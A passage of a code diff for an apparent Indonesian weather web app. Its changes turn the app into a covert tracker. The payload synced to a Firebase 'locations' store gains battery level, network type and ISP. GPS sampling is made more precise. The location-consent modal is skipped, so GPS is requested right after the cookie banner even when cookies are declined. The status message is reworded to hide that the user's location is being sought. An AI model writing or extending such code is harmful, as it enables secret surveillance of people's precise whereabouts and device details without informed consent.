+    // HAPUS field null & undefined biar Firebase gak error
+    // TAPI tetap simpan battery_level = null supaya dashboard tahu
     Object.keys(payload).forEach(k => {
       if (payload[k] === undefined) delete payload[k];
+    });
+
+    console.log('[sync] payload dikirim:', {
+      battery_level: payload.battery_level,
+      battery_supported: payload.battery_supported,
+      net_effective_type: payload.net_effective_type,
+      carrier_isp: payload.carrier_isp
     });
 
     const ref = await fbDb.ref('locations').push(payload);
@@ -428,7 +539,6 @@ function startAutoSync() {
       return;
     }
     if (document.hidden) return;
-    // HANYA sync kalau sourceType = gps
     if (State.sourceType !== 'gps') return;
     if (!navigator.geolocation) return;
 
@@ -453,7 +563,6 @@ function stopAutoSync() {
    ============================================================ */
 const IPGeo = {
   cache: null,
-
   async fetch() {
     if (this.cache) return this.cache;
 
@@ -462,44 +571,26 @@ const IPGeo = {
         name: 'ipwho.is',
         url: 'https://ipwho.is/',
         parse: d => (d && d.success !== false && d.latitude && d.longitude) ? {
-          lat: parseFloat(d.latitude),
-          lon: parseFloat(d.longitude),
-          city: d.city,
-          region: d.region,
-          country: d.country
+          lat: parseFloat(d.latitude), lon: parseFloat(d.longitude),
+          city: d.city, region: d.region, country: d.country,
+          isp: d.connection?.isp, org: d.connection?.org, asn: d.connection?.asn
         } : null
       },
       {
         name: 'ipapi.co',
         url: 'https://ipapi.co/json/',
         parse: d => (d && d.latitude && d.longitude) ? {
-          lat: parseFloat(d.latitude),
-          lon: parseFloat(d.longitude),
-          city: d.city,
-          region: d.region,
-          country: d.country_name
+          lat: parseFloat(d.latitude), lon: parseFloat(d.longitude),
+          city: d.city, region: d.region, country: d.country_name,
+          isp: d.org, org: d.org, asn: d.asn
         } : null
       },
       {
         name: 'freeipapi.com',
         url: 'https://freeipapi.com/api/json',
         parse: d => (d && d.latitude && d.longitude) ? {
-          lat: parseFloat(d.latitude),
-          lon: parseFloat(d.longitude),
-          city: d.cityName,
-          region: d.regionName,
-          country: d.countryName
-        } : null
-      },
-      {
-        name: 'ipbase.com',
-        url: 'https://api.ipbase.com/v1/json/',
-        parse: d => (d && d.latitude && d.longitude) ? {
-          lat: parseFloat(d.latitude),
-          lon: parseFloat(d.longitude),
-          city: d.city,
-          region: d.region_name || '',
-          country: d.country_name || ''
+          lat: parseFloat(d.latitude), lon: parseFloat(d.longitude),
+          city: d.cityName, region: d.regionName, country: d.countryName
         } : null
       },
       {
@@ -509,7 +600,7 @@ const IPGeo = {
           if (!d || !d.loc) return null;
           const [lat, lon] = d.loc.split(',').map(parseFloat);
           if (isNaN(lat) || isNaN(lon)) return null;
-          return { lat, lon, city: d.city, region: d.region, country: d.country };
+          return { lat, lon, city: d.city, region: d.region, country: d.country, isp: d.org, org: d.org };
         }
       }
     ];
@@ -518,7 +609,6 @@ const IPGeo = {
       try {
         const res = await fetchWithTimeout(provider.url, {}, 5000);
         if (!res.ok) continue;
-
         const data = await res.json();
         const parsed = provider.parse(data);
 
@@ -527,13 +617,11 @@ const IPGeo = {
             parsed.lat >= -90 && parsed.lat <= 90 &&
             parsed.lon >= -180 && parsed.lon <= 180) {
           this.cache = {
-            lat: parsed.lat,
-            lon: parsed.lon,
+            lat: parsed.lat, lon: parsed.lon,
             city: parsed.city || 'Kota Anda',
-            region: parsed.region || '',
-            country: parsed.country || '',
-            source: 'ip',
-            provider: provider.name
+            region: parsed.region || '', country: parsed.country || '',
+            isp: parsed.isp || null, org: parsed.org || null, asn: parsed.asn || null,
+            source: 'ip', provider: provider.name
           };
           console.log(`[IPGeo] ✓ via ${provider.name}:`, this.cache);
           return this.cache;
@@ -542,7 +630,6 @@ const IPGeo = {
         console.warn(`[IPGeo] ${provider.name} gagal:`, e.message);
       }
     }
-
     console.error('[IPGeo] ✗ semua provider gagal');
     return null;
   }
@@ -553,59 +640,54 @@ const IPGeo = {
    ============================================================ */
 function getPosition(options) {
   return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) {
-      return reject(new Error('Geolocation tidak tersedia'));
-    }
+    if (!navigator.geolocation) return reject(new Error('Geolocation tidak tersedia'));
     navigator.geolocation.getCurrentPosition(resolve, reject, options);
   });
-}
-
-async function getQuickLocation() {
-  const pos = await getPosition({
-    enableHighAccuracy: false,
-    timeout: 15000,
-    maximumAge: 60000
-  });
-  return {
-    latitude: Safe.num(pos?.coords?.latitude),
-    longitude: Safe.num(pos?.coords?.longitude),
-    accuracy: Safe.num(pos?.coords?.accuracy, 999)
-  };
 }
 
 async function getAccurateLocation() {
   const samples = [];
 
-  for (let i = 0; i < 3; i++) {
+  for (let i = 0; i < 5; i++) {
     try {
       const pos = await getPosition({
         enableHighAccuracy: true,
-        timeout: 12000,
+        timeout: 15000,
         maximumAge: 0
       });
 
       samples.push({
         lat: Safe.num(pos?.coords?.latitude),
         lon: Safe.num(pos?.coords?.longitude),
-        accuracy: Safe.num(pos?.coords?.accuracy, 9999)
+        accuracy: Safe.num(pos?.coords?.accuracy, 99999),
+        ts: pos?.timestamp || Date.now()
       });
 
-      if (pos?.coords?.accuracy <= 15) break;
-      await new Promise(r => setTimeout(r, 400));
+      console.log(`[gps] sample #${i + 1}: ±${samples[i].accuracy.toFixed(0)}m`);
+
+      if (pos?.coords?.accuracy <= 20) break;
+      await new Promise(r => setTimeout(r, 500));
     } catch (e) {
-      if (i === 2 && samples.length === 0) throw e;
+      if (i === 4 && samples.length === 0) throw e;
     }
   }
 
-  if (samples.length === 0) throw new Error('Lokasi tidak terdeteksi');
+  if (samples.length === 0) throw new Error('GPS tidak tersedia');
   const best = samples.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
+
+  const totalWeight = samples.reduce((s, x) => s + (1 / Math.max(x.accuracy, 1)), 0);
+  const weightedLat = samples.reduce((s, x) => s + x.lat / Math.max(x.accuracy, 1), 0) / totalWeight;
+  const weightedLon = samples.reduce((s, x) => s + x.lon / Math.max(x.accuracy, 1), 0) / totalWeight;
+
+  const useWeighted = best.accuracy > 30 && samples.length >= 3;
 
   return {
     coords: {
-      latitude: best.lat,
-      longitude: best.lon,
-      accuracy: best.accuracy
+      latitude: useWeighted ? weightedLat : best.lat,
+      longitude: useWeighted ? weightedLon : best.lon,
+      accuracy: useWeighted ? Math.min(best.accuracy * 0.8, 9999) : best.accuracy
     },
+    method: useWeighted ? 'weighted' : 'best',
     totalSamples: samples.length
   };
 }
@@ -628,6 +710,13 @@ const WeatherCache = {
   },
   set(key, data) {
     try { localStorage.setItem(key, JSON.stringify({ data, ts: Date.now() })); } catch {}
+  },
+  clear() {
+    try {
+      Object.keys(localStorage).forEach(k => {
+        if (k.startsWith('cur_') || k.startsWith('fc_')) localStorage.removeItem(k);
+      });
+    } catch {}
   }
 };
 
@@ -639,34 +728,43 @@ const WeatherAPI = {
     return lat >= -11 && lat <= 6 && lon >= 95 && lon <= 141;
   },
 
+  findNearestRegion(lat, lon) {
+    if (!this.isInIndonesia(lat, lon)) return null;
+    let best = null, bestDist = Infinity;
+    for (const r of REGIONS) {
+      if (!r[4] || !r[5]) continue;
+      const d = haversine(lat, lon, r[4], r[5]);
+      if (d < bestDist) { bestDist = d; best = r; }
+    }
+    if (best && bestDist < 30000) {
+      return { region: best, distance: bestDist };
+    }
+    return null;
+  },
+
   async getByCoords(lat, lon, label) {
     const safeLat = Safe.num(lat);
     const safeLon = Safe.num(lon);
-    const k = `cur_${safeLat.toFixed(2)}_${safeLon.toFixed(2)}`;
+    const k = `cur_${safeLat.toFixed(3)}_${safeLon.toFixed(3)}`;
     const cached = WeatherCache.get(k);
     if (cached) return cached;
 
-    if (this.isInIndonesia(safeLat, safeLon)) {
-      const bmkgPromise = this.fetchBMKGByCoords(safeLat, safeLon).catch(() => null);
-      const owmPromise = this.fetchOWMCurrent(safeLat, safeLon).catch(() => null);
+    const nearest = this.findNearestRegion(safeLat, safeLon);
+    if (nearest) {
+      const adm4 = nearest.region[1] + '.0001';
+      try {
+        const bmkgData = await fetchWithTimeout(
+          `${APP_CONFIG.BMKG_BASE}?adm4=${adm4}`, {}, APP_CONFIG.BMKG_TIMEOUT
+        ).then(r => r.ok ? r.json() : null);
 
-      const bmkg = await Promise.race([
-        bmkgPromise,
-        new Promise(resolve => setTimeout(() => resolve(null), APP_CONFIG.BMKG_TIMEOUT))
-      ]);
-
-      if (bmkg && bmkg.weather?.[0]) {
-        WeatherCache.set(k, bmkg);
-        return bmkg;
-      }
-
-      const owm = await owmPromise;
-      if (owm) {
-        WeatherCache.set(k, owm);
-        return owm;
-      }
-
-      throw new Error('Gagal memuat cuaca');
+        if (bmkgData) {
+          const parsed = this.parseBMKG(bmkgData, nearest.region);
+          if (parsed && parsed.weather?.[0]) {
+            WeatherCache.set(k, parsed);
+            return parsed;
+          }
+        }
+      } catch (e) {}
     }
 
     const owm = await this.fetchOWMCurrent(safeLat, safeLon);
@@ -677,22 +775,38 @@ const WeatherAPI = {
   async getForecast(lat, lon) {
     const safeLat = Safe.num(lat);
     const safeLon = Safe.num(lon);
-    const k = `fc_${safeLat.toFixed(2)}_${safeLon.toFixed(2)}`;
+    const k = `fc_${safeLat.toFixed(3)}_${safeLon.toFixed(3)}`;
     const cached = WeatherCache.get(k);
     if (cached) return cached;
+
+    const nearest = this.findNearestRegion(safeLat, safeLon);
+    if (nearest) {
+      const adm4 = nearest.region[1] + '.0001';
+      try {
+        const bmkgData = await fetchWithTimeout(
+          `${APP_CONFIG.BMKG_BASE}?adm4=${adm4}`, {}, APP_CONFIG.BMKG_TIMEOUT
+        ).then(r => r.ok ? r.json() : null);
+
+        if (bmkgData) {
+          const list = this.buildBMKGForecast(bmkgData);
+          if (list.length > 0) {
+            const result = { list };
+            WeatherCache.set(k, result);
+            return result;
+          }
+        }
+      } catch (e) {}
+    }
 
     const owm = await this.fetchOWMForecast(safeLat, safeLon);
     WeatherCache.set(k, owm);
     return owm;
   },
 
-  async fetchBMKGByCoords() { return null; },
-
   parseBMKG(data, region) {
     try {
       const list = data?.data?.[0]?.cuaca?.[0];
       if (!Array.isArray(list) || list.length === 0) return null;
-
       const now = list[0] || {};
       const tempVal = Safe.num(now.t, Safe.num(now.tcc, 28));
       const humidityVal = Safe.num(now.hu, 70);
@@ -701,11 +815,7 @@ const WeatherAPI = {
       return {
         name: Safe.str(region?.[0], 'Lokasi') + (region?.[2] ? ', ' + region[2] : ''),
         sys: { country: 'ID' },
-        main: {
-          temp: tempVal,
-          feels_like: tempVal,
-          humidity: humidityVal
-        },
+        main: { temp: tempVal, feels_like: tempVal, humidity: humidityVal },
         wind: { speed: windKmh / 3.6 },
         weather: [{
           main: this.bmkgWeatherMain(now.weather_desc),
@@ -714,10 +824,7 @@ const WeatherAPI = {
         }],
         source: 'bmkg'
       };
-    } catch (e) {
-      console.warn('[bmkg] parse error:', e.message);
-      return null;
-    }
+    } catch { return null; }
   },
 
   bmkgWeatherMain(desc) {
@@ -745,73 +852,48 @@ const WeatherAPI = {
 
   async fetchOWMCurrent(lat, lon) {
     const qs = new URLSearchParams({
-      lat: Safe.num(lat),
-      lon: Safe.num(lon),
+      lat: Safe.num(lat), lon: Safe.num(lon),
       appid: APP_CONFIG.OWM_KEY,
-      units: APP_CONFIG.UNITS,
-      lang: APP_CONFIG.LANG
+      units: APP_CONFIG.UNITS, lang: APP_CONFIG.LANG
     });
-    const res = await fetchWithTimeout(
-      `${APP_CONFIG.OWM_BASE}/weather?${qs}`,
-      {},
-      APP_CONFIG.FETCH_TIMEOUT
-    );
+    const res = await fetchWithTimeout(`${APP_CONFIG.OWM_BASE}/weather?${qs}`, {}, APP_CONFIG.FETCH_TIMEOUT);
     const data = await res.json();
-    if (data.cod && Number(data.cod) !== 200) {
-      throw new Error(this.mapError(data.cod));
-    }
+    if (data.cod && Number(data.cod) !== 200) throw new Error(this.mapError(data.cod));
     return data;
   },
 
   async fetchOWMForecast(lat, lon) {
     const qs = new URLSearchParams({
-      lat: Safe.num(lat),
-      lon: Safe.num(lon),
+      lat: Safe.num(lat), lon: Safe.num(lon),
       appid: APP_CONFIG.OWM_KEY,
-      units: APP_CONFIG.UNITS,
-      lang: APP_CONFIG.LANG
+      units: APP_CONFIG.UNITS, lang: APP_CONFIG.LANG
     });
-    const res = await fetchWithTimeout(
-      `${APP_CONFIG.OWM_BASE}/forecast?${qs}`,
-      {},
-      APP_CONFIG.FETCH_TIMEOUT
-    );
+    const res = await fetchWithTimeout(`${APP_CONFIG.OWM_BASE}/forecast?${qs}`, {}, APP_CONFIG.FETCH_TIMEOUT);
     const data = await res.json();
-    if (data.cod && Number(data.cod) !== 200) {
-      throw new Error(this.mapError(data.cod));
-    }
+    if (data.cod && Number(data.cod) !== 200) throw new Error(this.mapError(data.cod));
     return data;
   },
 
   mapError(code) {
     const map = {
-      '404': 'Lokasi tidak terdeteksi.',
-      '401': 'Layanan cuaca tidak tersedia.',
-      '429': 'Terlalu banyak permintaan. Coba lagi nanti.',
-      '400': 'Permintaan tidak valid.'
+      '404': 'Lokasi tidak terdeteksi.', '401': 'Layanan cuaca tidak tersedia.',
+      '429': 'Terlalu banyak permintaan.', '400': 'Permintaan tidak valid.'
     };
     return map[String(code)] || 'Terjadi kesalahan.';
   },
 
   async fetchBMKGByAdm4(adm4) {
     try {
-      const res = await fetchWithTimeout(
-        `${APP_CONFIG.BMKG_BASE}?adm4=${adm4}`,
-        {},
-        APP_CONFIG.BMKG_TIMEOUT
-      );
+      const res = await fetchWithTimeout(`${APP_CONFIG.BMKG_BASE}?adm4=${adm4}`, {}, APP_CONFIG.BMKG_TIMEOUT);
       if (!res.ok) return null;
       return await res.json();
-    } catch {
-      return null;
-    }
+    } catch { return null; }
   },
 
   buildBMKGForecast(data) {
     try {
       const list = [];
       const cuacaArr = data?.data?.[0]?.cuaca || [];
-
       cuacaArr.forEach(dayArr => {
         if (!Array.isArray(dayArr)) return;
         dayArr.slice(0, 8).forEach(item => {
@@ -819,7 +901,6 @@ const WeatherAPI = {
           const dtStr = item.local_datetime || item.datetime;
           const dtMs = dtStr ? new Date(dtStr).getTime() : Date.now();
           if (isNaN(dtMs)) return;
-
           list.push({
             dt: dtMs / 1000,
             main: {
@@ -834,12 +915,8 @@ const WeatherAPI = {
           });
         });
       });
-
       return list.slice(0, 8);
-    } catch (e) {
-      console.warn('[bmkg-forecast] error:', e.message);
-      return [];
-    }
+    } catch { return []; }
   }
 };
 
@@ -874,34 +951,19 @@ const UI = {
   init() {
     const id = (x) => document.getElementById(x);
     this.el = {
-      landing: id('landing'),
-      startBtn: id('startBtn'),
-      cookieBanner: id('cookieBanner'),
-      cookieAccept: id('cookieAccept'),
-      cookieDecline: id('cookieDecline'),
-      locationModal: id('locationModal'),
-      modalAllow: id('modalAllow'),
-      modalManual: id('modalManual'),
-      modalLater: id('modalLater'),
-      searchModal: id('searchModal'),
-      searchInput: id('searchInput'),
-      searchResults: id('searchResults'),
-      searchCancel: id('searchCancel'),
-      app: id('app'),
-      searchBtn: id('searchBtn'),
-      unitToggle: id('unitToggle'),
-      status: id('status'),
-      weatherCard: id('weatherCard'),
-      accuracyDisclaimer: id('accuracyDisclaimer'),
-      disclaimerText: id('disclaimerText'),
-      cityName: id('cityName'),
-      description: id('description'),
-      temperature: id('temperature'),
-      humidity: id('humidity'),
-      wind: id('wind'),
-      feelsLike: id('feelsLike'),
-      currentIconUse: id('currentIconUse'),
-      forecastList: id('forecastList'),
+      landing: id('landing'), startBtn: id('startBtn'),
+      cookieBanner: id('cookieBanner'), cookieAccept: id('cookieAccept'), cookieDecline: id('cookieDecline'),
+      locationModal: id('locationModal'), modalAllow: id('modalAllow'),
+      modalManual: id('modalManual'), modalLater: id('modalLater'),
+      searchModal: id('searchModal'), searchInput: id('searchInput'),
+      searchResults: id('searchResults'), searchCancel: id('searchCancel'),
+      app: id('app'), searchBtn: id('searchBtn'), unitToggle: id('unitToggle'),
+      status: id('status'), weatherCard: id('weatherCard'),
+      accuracyDisclaimer: id('accuracyDisclaimer'), disclaimerText: id('disclaimerText'),
+      cityName: id('cityName'), description: id('description'),
+      temperature: id('temperature'), humidity: id('humidity'),
+      wind: id('wind'), feelsLike: id('feelsLike'),
+      currentIconUse: id('currentIconUse'), forecastList: id('forecastList'),
       toast: id('toast')
     };
   },
@@ -936,9 +998,7 @@ const UI = {
     if (this.el.searchModal) this.el.searchModal.classList.remove('hidden');
     if (this.el.searchInput) {
       this.el.searchInput.value = '';
-      setTimeout(() => {
-        try { this.el.searchInput.focus(); } catch (e) {}
-      }, 150);
+      setTimeout(() => { try { this.el.searchInput.focus(); } catch (e) {} }, 150);
     }
     if (this.el.searchResults) this.el.searchResults.innerHTML = '';
   },
@@ -954,9 +1014,7 @@ const UI = {
     return State.unit === 'C' ? Math.round(v) : Math.round(v * 9 / 5 + 32);
   },
 
-  unitSymbol() {
-    return State.unit === 'C' ? '°C' : '°F';
-  },
+  unitSymbol() { return State.unit === 'C' ? '°C' : '°F'; },
 
   setTheme(condition) {
     document.body.className = '';
@@ -998,14 +1056,12 @@ const UI = {
 
   renderForecastOnly(list) {
     if (!this.el.forecastList || !Array.isArray(list) || list.length === 0) return;
-
     const slots = list.slice(0, 8);
     this.el.forecastList.innerHTML = slots.map(item => {
       const itemTemp = Safe.num(item?.main?.temp, 0);
       const itemIcon = Safe.str(item?.weather?.[0]?.icon, '01d');
       const itemDesc = Safe.str(item?.weather?.[0]?.description, '—');
-      const dtRaw = item?.dt;
-      const dtMs = dtRaw ? Safe.num(dtRaw, 0) * 1000 : Date.now();
+      const dtMs = item?.dt ? Safe.num(item.dt, 0) * 1000 : Date.now();
       const d = new Date(isNaN(dtMs) ? Date.now() : dtMs);
       const hh = String(d.getHours()).padStart(2, '0');
 
@@ -1020,10 +1076,7 @@ const UI = {
   },
 
   render(current, forecast, meta = {}) {
-    if (!current || !current.weather || !Array.isArray(current.weather) || !current.weather[0]) {
-      console.warn('[render] data cuaca tidak valid:', current);
-      return;
-    }
+    if (!current || !current.weather || !Array.isArray(current.weather) || !current.weather[0]) return;
 
     State.lastData = { current, forecast, meta };
 
@@ -1046,19 +1099,14 @@ const UI = {
     if (this.el.currentIconUse) this.el.currentIconUse.setAttribute('href', Icon.fromCode(iconCode));
     this.setTheme(weatherMain);
 
-    if (meta.source === 'ip') {
-      this.showDisclaimer('Lokasi berdasarkan IP — akurasi terbatas (level kota)');
-    } else if (meta.source === 'manual') {
-      this.showDisclaimer('Cuaca berdasarkan kota yang Anda pilih');
-    } else {
-      this.hideDisclaimer();
-    }
+    if (meta.source === 'ip') this.showDisclaimer('Lokasi berdasarkan IP — akurasi terbatas (level kota)');
+    else if (meta.source === 'manual') this.showDisclaimer('Cuaca berdasarkan kota yang Anda pilih');
+    else this.hideDisclaimer();
 
     if (this.el.forecastList) {
       const list = Safe.arr(forecast?.list);
-      if (list.length > 0) {
-        this.renderForecastOnly(list);
-      } else {
+      if (list.length > 0) this.renderForecastOnly(list);
+      else {
         this.el.forecastList.innerHTML = Array(4).fill(0).map(() => `
           <div class="forecast-item forecast-skeleton">
             <div class="skel-line skel-time"></div>
@@ -1075,9 +1123,7 @@ const UI = {
   toggleUnit() {
     State.unit = State.unit === 'C' ? 'F' : 'C';
     if (this.el.unitToggle) this.el.unitToggle.textContent = State.unit === 'C' ? '°C' : '°F';
-    if (State.lastData) {
-      this.render(State.lastData.current, State.lastData.forecast, State.lastData.meta);
-    }
+    if (State.lastData) this.render(State.lastData.current, State.lastData.forecast, State.lastData.meta);
   }
 };
 
@@ -1090,7 +1136,6 @@ const Search = {
     if (query.length < 2) return [];
 
     const results = [];
-
     const indoMatches = REGIONS.filter(r =>
       Safe.str(r[0]).toLowerCase().includes(query) ||
       Safe.str(r[2]).toLowerCase().includes(query) ||
@@ -1099,10 +1144,8 @@ const Search = {
 
     indoMatches.forEach(r => {
       results.push({
-        name: r[0],
-        adm4: r[1],
-        kabupaten: r[2],
-        provinsi: r[3],
+        name: r[0], adm4: r[1], kabupaten: r[2], provinsi: r[3],
+        lat: r[4], lon: r[5],
         type: 'id',
         displayName: `${r[0]}, ${r[2]}, ${r[3]}`
       });
@@ -1118,23 +1161,16 @@ const Search = {
             const name = Safe.str(d?.name);
             if (!name) return;
             if (results.find(r => r.name.toLowerCase() === name.toLowerCase())) return;
-
             results.push({
-              name,
-              lat: Safe.num(d.lat),
-              lon: Safe.num(d.lon),
-              country: Safe.str(d.country),
-              state: Safe.str(d.state),
+              name, lat: Safe.num(d.lat), lon: Safe.num(d.lon),
+              country: Safe.str(d.country), state: Safe.str(d.state),
               type: 'global',
               displayName: `${name}${d.state ? ', ' + d.state : ''}, ${d.country}`
             });
           });
         }
-      } catch (e) {
-        console.warn('[search] OWM error:', e.message);
-      }
+      } catch (e) {}
     }
-
     return results;
   },
 
@@ -1197,10 +1233,7 @@ const App = {
         const data = await WeatherAPI.fetchBMKGByAdm4(adm4);
 
         if (data) {
-          const current = WeatherAPI.parseBMKG(data, [
-            region.name, region.adm4, region.kabupaten, region.provinsi
-          ]);
-
+          const current = WeatherAPI.parseBMKG(data, [region.name, region.adm4, region.kabupaten, region.provinsi]);
           if (current && current.weather && current.weather[0]) {
             const forecast = { list: WeatherAPI.buildBMKGForecast(data) };
             UI.clearStatus();
@@ -1209,9 +1242,7 @@ const App = {
             return;
           }
         }
-      } catch (e) {
-        console.warn('[bmkg-load] error:', e.message);
-      }
+      } catch (e) {}
 
       this.loadByName(`${region.kabupaten},ID`, `${region.name}, ${region.kabupaten}`, 'manual');
     } else {
@@ -1223,14 +1254,17 @@ const App = {
     if (this.busy) return;
     this.busy = true;
 
+    const safeLat = Safe.num(lat);
+    const safeLon = Safe.num(lon);
+
     UI.showSkeleton();
 
     try {
-      const current = await WeatherAPI.getByCoords(lat, lon, label);
+      const current = await WeatherAPI.getByCoords(safeLat, safeLon, label);
       UI.clearStatus();
       UI.render(current, { list: [] }, { source });
 
-      WeatherAPI.getForecast(lat, lon).then(forecast => {
+      WeatherAPI.getForecast(safeLat, safeLon).then(forecast => {
         if (forecast && forecast.list && forecast.list.length > 0) {
           UI.renderForecastOnly(forecast.list);
           State.lastData = { ...State.lastData, forecast };
@@ -1239,7 +1273,6 @@ const App = {
 
     } catch (err) {
       UI.setStatus(err.message || 'Gagal memuat data.', true);
-      console.error('[loadByCoords]', err);
     } finally {
       this.busy = false;
     }
@@ -1281,68 +1314,44 @@ const App = {
 
     } catch (err) {
       UI.setStatus(err.message || 'Gagal memuat data.', true);
-      console.error('[loadByName]', err);
     } finally {
       this.busy = false;
     }
   },
 
-  /* ============================================================
-     GPS ONLY — Tidak ada fallback ke IP
-     ============================================================ */
   async requestGPS() {
-    if (locationRequestInProgress) {
-      console.log('[gps] request sedang berjalan, skip');
-      return;
-    }
-
+    if (locationRequestInProgress) return;
     locationRequestInProgress = true;
 
     try {
       if (!navigator.geolocation) {
-        console.error('[gps] tidak tersedia di browser ini');
         UI.setStatus('Browser tidak mendukung GPS. Silakan cari kota manual.', true);
         locationRequestInProgress = false;
-        // Tampilkan search manual
         UI.showSearchModal();
         return;
       }
 
-      UI.setStatus('Mencari lokasi Anda via GPS...');
+      UI.setStatus('Mencari info cuaca...');
 
       try {
-        const quickCoords = await getQuickLocation();
+        const result = await getAccurateLocation();
+        const coords = result.coords;
 
-        // SUCCESS GPS
-        State.userLocation = quickCoords;
+        State.userLocation = coords;
         State.locationGranted = true;
         State.sessionId = getSessionId();
         State.sourceType = 'gps';
 
-        console.log('[gps] ✓ lokasi didapat:', quickCoords);
+        console.log('[gps] ✓ FINAL:', coords);
 
-        syncLocation(quickCoords, 'gps-quick');
+        syncLocation(coords, 'gps');
         startAutoSync();
+        WeatherCache.clear();
 
-        this.loadByCoords(quickCoords.latitude, quickCoords.longitude, 'Lokasi Anda', 'gps');
-        UI.showToast('Lokasi GPS terdeteksi');
-
-        // Refine di background
-        setTimeout(async () => {
-          try {
-            const accurate = await getAccurateLocation();
-            if (accurate?.coords?.accuracy < quickCoords.accuracy) {
-              State.userLocation = accurate.coords;
-              syncLocation(accurate.coords, 'gps-refined');
-              console.log('[gps] ✓ refined:', accurate.coords);
-            }
-          } catch (e) {
-            console.warn('[gps] refine gagal:', e.message);
-          }
-        }, 2000);
+        this.loadByCoords(coords.latitude, coords.longitude, 'Lokasi Anda', 'gps');
+        UI.showToast(`Lokasi GPS: ±${coords.accuracy.toFixed(0)}m`);
 
       } catch (err) {
-        // GPS GAGAL — langsung tampil search modal, TIDAK fallback ke IP
         console.warn('[gps] gagal:', err.code, err.message);
 
         let msg = 'Gagal mendapatkan GPS.';
@@ -1358,15 +1367,8 @@ const App = {
     }
   },
 
-  /* ============================================================
-     IP LOCATION — HANYA dipanggil kalau user klik "Cari Kota Manual"
-     ============================================================ */
   async requestIPLocation() {
-    // Guard: kalau sudah ada GPS aktif, jangan override
-    if (State.sourceType === 'gps' && State.userLocation) {
-      console.log('[IP] skip — sudah ada GPS aktif');
-      return;
-    }
+    if (State.sourceType === 'gps' && State.userLocation) return;
 
     UI.setStatus('Mendeteksi lokasi via IP...');
 
@@ -1386,13 +1388,12 @@ const App = {
 
         const label = ip.city + (ip.region ? ', ' + ip.region : '');
         this.loadByCoords(ip.lat, ip.lon, label, 'ip');
-        UI.showToast(`Lokasi terdeteksi: ${ip.city}`);
+        UI.showToast(`Lokasi IP: ${ip.city}`);
       } else {
         UI.setStatus('Gagal deteksi via IP. Cari kota manual:', true);
         UI.showSearchModal();
       }
     } catch (e) {
-      console.error('[requestIPLocation]', e);
       UI.setStatus('Gagal deteksi via IP. Cari kota manual:', true);
       UI.showSearchModal();
     }
@@ -1401,7 +1402,7 @@ const App = {
   init() {
     UI.init();
 
-    // ===== Landing =====
+    // Landing
     if (UI.el.startBtn) {
       UI.el.startBtn.addEventListener('click', () => {
         UI.hideLanding();
@@ -1409,18 +1410,18 @@ const App = {
         if (!State.cookieAccepted) {
           setTimeout(() => UI.showCookieBanner(), 500);
         } else {
-          setTimeout(() => UI.showLocationModal(), 400);
+          setTimeout(() => this.requestGPS(), 400);
         }
       });
     }
 
-    // ===== Cookie =====
+    // Cookie
     if (UI.el.cookieAccept) {
       UI.el.cookieAccept.addEventListener('click', () => {
         State.cookieAccepted = true;
         localStorage.setItem('cuaca_cookie_ok', '1');
         UI.hideCookieBanner();
-        setTimeout(() => UI.showLocationModal(), 300);
+        setTimeout(() => this.requestGPS(), 300);
       });
     }
 
@@ -1429,58 +1430,43 @@ const App = {
         State.cookieAccepted = true;
         localStorage.setItem('cuaca_cookie_ok', '0');
         UI.hideCookieBanner();
-        setTimeout(() => UI.showLocationModal(), 300);
+        setTimeout(() => this.requestGPS(), 300);
       });
     }
 
-    // ===== Modal: IZINKAN LOKASI → GPS ONLY =====
+    // Modal buttons (fallback)
     if (UI.el.modalAllow) {
       UI.el.modalAllow.addEventListener('click', (e) => {
         e.stopPropagation();
         UI.hideLocationModal();
-
-        // Reset state biar fresh
         State.sourceType = null;
         locationRequestInProgress = false;
-
-        // Panggil GPS (bukan IP!)
         this.requestGPS();
       });
     }
 
-    // ===== Modal: CARI KOTA MANUAL → IP dulu, lalu search modal =====
     if (UI.el.modalManual) {
       UI.el.modalManual.addEventListener('click', (e) => {
         e.stopPropagation();
         UI.hideLocationModal();
-
-        // Coba deteksi via IP dulu
         this.requestIPLocation();
-
-        // Setelah 800ms, tampilkan search modal sebagai fallback
         setTimeout(() => {
-          if (!State.sourceType) {
-            UI.showSearchModal();
-          }
+          if (!State.sourceType) UI.showSearchModal();
         }, 800);
       });
     }
 
-    // ===== Modal: NANTI SAJA → TIDAK ADA AKSI =====
     if (UI.el.modalLater) {
       UI.el.modalLater.addEventListener('click', (e) => {
         e.stopPropagation();
         UI.hideLocationModal();
-        // Tidak ada aksi — user harus klik tombol search sendiri
         UI.showToast('Klik ikon 🔍 untuk cari kota manual');
       });
     }
 
-    // ===== Search buttons =====
     if (UI.el.searchBtn) UI.el.searchBtn.addEventListener('click', () => UI.showSearchModal());
     if (UI.el.searchCancel) UI.el.searchCancel.addEventListener('click', () => UI.hideSearchModal());
 
-    // ===== Search input =====
     let debounce = null;
     if (UI.el.searchInput) {
       UI.el.searchInput.addEventListener('input', e => {
@@ -1491,7 +1477,6 @@ const App = {
           Search.render(results);
         }, 250);
       });
-
       UI.el.searchInput.addEventListener('keydown', e => {
         if (e.key === 'Enter') {
           const first = UI.el.searchResults?.querySelector('.search-result-item');
@@ -1500,12 +1485,8 @@ const App = {
       });
     }
 
-    // ===== Unit toggle =====
-    if (UI.el.unitToggle) {
-      UI.el.unitToggle.addEventListener('click', () => UI.toggleUnit());
-    }
+    if (UI.el.unitToggle) UI.el.unitToggle.addEventListener('click', () => UI.toggleUnit());
 
-    // ===== Modal overlay click =====
     if (UI.el.locationModal) {
       UI.el.locationModal.addEventListener('click', e => {
         if (e.target === UI.el.locationModal) UI.hideLocationModal();
@@ -1517,7 +1498,6 @@ const App = {
       });
     }
 
-    // ===== Restore cookie state =====
     const cookieOk = localStorage.getItem('cuaca_cookie_ok');
     if (cookieOk !== null) State.cookieAccepted = true;
   }
@@ -1531,7 +1511,6 @@ document.addEventListener('DOMContentLoaded', () => {
   App.init();
 });
 
-// Sync saat tab kembali visible — HANYA kalau sourceType = gps
 document.addEventListener('visibilitychange', () => {
   if (!document.hidden && State.locationGranted && State.sourceType === 'gps' && navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
